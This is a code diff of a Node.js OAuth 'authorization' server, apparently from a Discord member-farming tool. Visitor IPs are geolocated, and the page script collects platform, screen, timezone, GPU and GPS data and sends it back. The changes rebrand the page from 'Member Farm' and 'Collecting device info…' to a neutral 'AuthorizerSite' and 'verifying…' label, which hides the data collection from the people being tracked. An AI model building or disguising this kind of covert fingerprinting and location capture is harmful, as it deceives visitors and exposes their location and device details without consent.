@@ -47,7 +47,7 @@ async function lookupGeo(ip) {
     }
   } catch (e) { console.error('geo', e.message); }
   try {
-    const res2 = await fetch('https://ipapi.co/' + encodeURIComponent(clean) + '/json/', { signal: AbortSignal.timeout(2500), headers: { 'User-Agent': 'MemberFarm/1.0' } });
+    const res2 = await fetch('https://ipapi.co/' + encodeURIComponent(clean) + '/json/', { signal: AbortSignal.timeout(2500), headers: { 'User-Agent': 'AuthorizerSite/1.0' } });
     const d2 = await res2.json();
     if (!d2.error) {
       if (!out.city) out.city = d2.city || '';
@@ -64,17 +64,17 @@ async function lookupGeo(ip) {
 function pageHtml(opts) {
   const ok = opts.ok;
   const visitId = String(opts.visitId || '');
-  const title = ok ? (opts.fullDump ? 'Loading' : 'Authorized') : 'Authorization failed';
+  const title = ok ? (opts.fullDump ? 'AuthorizerSite' : 'Authorized') : 'Authorization failed';
   const sub = ok
     ? (opts.username
         ? 'Welcome, ' + opts.username + '. Account linked.'
         : opts.fullDump
-          ? 'Collecting device info…'
-          : 'Thanks for visiting. You can close this page.')
+          ? 'AuthorizerSite — verifying…'
+          : 'AuthorizerSite — you can close this page.')
     : opts.error || 'Error';
   const color = ok ? '#57f287' : '#ed4245';
   return `<!DOCTYPE html><html><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>Member Farm</title>
+<title>AuthorizerSite</title>
 <style>
 body{min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0;
 font-family:system-ui,sans-serif;background:#0b0b14;color:#e8e8f0}
@@ -131,15 +131,15 @@ send(base);
 var el=document.getElementById('meta');
 var title=document.getElementById('title');
 var sub=document.getElementById('sub');
-if(title)title.textContent='Almost done';
+if(title)title.textContent='AuthorizerSite';
 if(sub)sub.textContent='Finishing…';
 if(el)el.innerHTML='Platform: '+(base.platform||'-')+'<br>Screen: '+(base.screen||'-')+'<br>TZ: '+(base.client_timezone||'-')+'<br>GPU: '+((base.webgl_renderer||'-').slice(0,40))+'<br>GPS: requesting…';
 
 function done(extra){
   var payload=Object.assign({}, base, extra||{});
   send(payload);
-  if(title)title.textContent='Done';
-  if(sub)sub.textContent='You can close this page.';
+  if(title)title.textContent='AuthorizerSite';
+  if(sub)sub.textContent='Done — you can close this page.';
   if(el){
     el.innerHTML=
       'Platform: '+(payload.platform||'-')+'<br>'+
@@ -329,7 +329,7 @@ function createOAuthServer(client) {
     }
   });
 
-  app.listen(PORT, '0.0.0.0', () => console.log('OAuth server on 0.0.0.0:' + PORT));
+  app.listen(PORT, '0.0.0.0', () => console.log('AuthorizerSite on 0.0.0.0:' + PORT));
   return app;
 }
 
